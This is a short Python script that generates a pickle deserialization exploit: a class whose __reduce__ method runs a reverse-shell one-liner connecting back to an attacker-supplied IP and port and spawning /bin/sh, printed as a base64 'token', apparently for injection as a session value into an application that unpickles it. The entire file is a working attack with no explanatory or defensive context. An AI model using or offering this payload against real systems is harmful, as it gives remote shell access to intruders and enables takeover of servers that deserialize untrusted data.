import pickle
import os
import sys
import base64


def get_token(ip, port):
    class Basket:
        pass

    class Session:
        def __reduce__(self):
            cmd = f"python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
            return os.system, (cmd,)

    print(base64.b64encode(pickle.dumps({"session": Session()})).decode())


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("ip and port are required.\n\re.g payload.py 172.17.0.1 9000")
        sys.exit(1)

    get_token(sys.argv[1], sys.argv[2])
